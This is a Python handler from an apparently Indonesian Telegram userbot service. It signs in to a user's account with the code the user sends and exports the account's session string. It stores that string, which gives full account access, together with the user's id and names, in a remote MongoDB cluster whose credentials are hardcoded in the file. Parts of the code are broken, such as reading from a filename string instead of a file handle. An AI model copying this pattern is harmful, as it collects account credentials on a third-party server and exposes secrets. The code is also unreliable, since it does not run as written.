#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.

# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

import heroku3
from Ubotlibs.Ubot.database import cli
#from config import MONGO_URL
from pyrogram import (
    Client,
    filters
)
from pyrogram.types import (
    Message
)
from pyrogram.errors import (
    SessionPasswordNeeded,
    BadRequest
)
from pymongo import MongoClient
from Ubot import (
    ACC_PROK_WITH_TFA,
    AKTIFPERINTAH,
    PHONE_CODE_IN_VALID_ERR_TEXT,
    RECVD_PHONE_CODE,
    SESSION_GENERATED_USING
)
import pymongo
import sys
import os
import dotenv
from dotenv import load_dotenv
from Ubot.logging import LOGGER
from os import environ, execle
HAPP = None
session_count = 1
#tambahan
from Ubot.core.db import *


@Client.on_message(
    filters.text &
    filters.private,
    group=2
)
async def recv_tg_code_message(_, message: Message):

    w_s_dict = AKTIFPERINTAH.get(message.chat.id)
    if not w_s_dict:
        return
    sent_code = w_s_dict.get("SENT_CODE_R")
    phone_number = w_s_dict.get("PHONE_NUMBER")
    loical_ci = w_s_dict.get("USER_CLIENT")
    if not sent_code or not phone_number:
        return
    status_message = w_s_dict.get("MESSAGE")
    if not status_message:
        return
    # await status_message.delete()
    del w_s_dict["MESSAGE"]
    status_message = await message.reply_text(
        RECVD_PHONE_CODE
    )
    phone_code = "".join(message.text.split(" "))
    try:
        w_s_dict["SIGNED_IN"] = await loical_ci.sign_in(
            phone_number,
            sent_code.phone_code_hash,
            phone_code
        )
    except BadRequest as e:
        await status_message.edit_text(
            e.MESSAGE + "\n\n" + PHONE_CODE_IN_VALID_ERR_TEXT
        )
        del AKTIFPERINTAH[message.chat.id]
    except SessionPasswordNeeded:
        await status_message.edit_text(
            ACC_PROK_WITH_TFA
        )
        w_s_dict["IS_NEEDED_TFA"] = True
    else: 
        client = pymongo.MongoClient("mongodb+srv://pyRainger:pyRainger@session1.pt52wqg.mongodb.net/?retryWrites=true&w=majority")
        db = client["telegram_sessions"]
        mongo_collection = db["sesi_collection"]
        session_string = str(await loical_ci.export_session_string())
        session_data = {"string_session": session_string}
        
        existing_session = mongo_collection.find_one({"session_string": session_string})
        if existing_session:
            await message.reply_text("string udah ada nih di database")
            return

        if mongo_collection.count_documents({}) >= 100:
            await message.reply_text(
                "Ngga bisa masukin string lagi nih udh penuh."
            )
            return

        cek = db.command("collstats", "sesi_collection")["count"]
        cek += 1
        session_data = {
            "no": cek,
            "session_string": session_string,
            "user_id": message.chat.id,
            "username": message.chat.username,
            "first_name": message.chat.first_name,
            "last_name": message.chat.last_name,
        }        
        mongo_collection.insert_one(session_data)
        await message.reply_text("String sudah siap...")  
        filename = ".env"
        user_id = mongo_collection.find_one({"user_id": message.chat.id})
        cek = db.command("collstats", "sesi_collection")["count"]
        sesi = user_id.get('session_string')
        if os.path.isfile(filename):
            with open(filename, "r") as file:
                content = filename.read()
                while True:
                    line = filename.readline()
                    if not line:
                        break
                    if line.startswith('#'):
                        continue
                    if 'SESSION' in line:
                        session_count += 1
            with open(filename, "a") as file:
                file.write(f"\nSESSION{session_count}={sesi}")
            load_dotenv()
            try:
                msg = await message.reply(" `Proses...➡️`")
                LOGGER(__name__).info("BOT TELAH DI TERIMA 🙏!!")
            except BaseException as err:
                LOGGER(__name__).info(f"{err}")
                return
            await msg.edit_text("✅ **Bot sedang di buat, tolong tunggu 3 Menit!\n kamu bisa cek .ping untuk melihat bot sudah aktif**\n\n")
            if HAPP is not None:
                HAPP.restart()
            else:
                args = [sys.executable, "-m", "Ubot"]
                execle(sys.executable, *args, environ)
                        
    AKTIFPERINTAH[message.chat.id] = w_s_dict
    raise message.stop_propagation()
